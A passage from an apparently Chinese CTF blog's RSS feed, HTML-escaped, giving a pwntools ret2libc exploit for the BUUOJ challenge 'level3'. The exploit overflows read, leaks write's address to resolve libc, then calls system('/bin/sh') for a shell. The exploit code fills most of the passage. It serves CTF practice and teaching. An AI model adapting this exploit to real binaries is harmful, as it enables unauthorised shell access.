 ####3. 发现有 write 和 read 函数，其中 read 函数可以进行栈溢出，可以对此利用 	注意:write (1, 输出地址，输出字节数)&lt;br /&gt;
 因为没有发现后门函数，所以利用&lt;/strong&gt; write 泄露 libc 的地址来执行 system (/bin/sh)&lt;/strong&gt;&lt;br /&gt;
###exp:&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; LibcSearcher3 &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;  &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	context&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;log_level &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;debug&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	p&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;remote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;node4.buuoj.cn&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;28074&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	e&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;ELF&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;./level3&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	write_plt&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;plt&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;write&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	read_got&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;got&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;write&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	main&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;e&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;symbols&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;main&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Input:\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	payload1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x88&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;write_plt&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;main&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;read_got&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	&lt;span class=&#34;token comment&#34;&gt;#p.recvuntil(&#34;Input:\n&#34;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	read&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;u32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recv&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	libc&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;LibcSearcher&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;write&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;read&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	libcbase&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;read&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;write&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	system&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;libcbase&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;system&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	binsh&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;libcbase&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;libc&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;dump&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;str_bin_sh&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;recvuntil&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Input:\n&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	payload2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#34;a&#34;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x88&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;system&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p32&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;binsh&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendline&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;	p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;#### 此题无法用 libcsearcher 远程库找到 libc&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
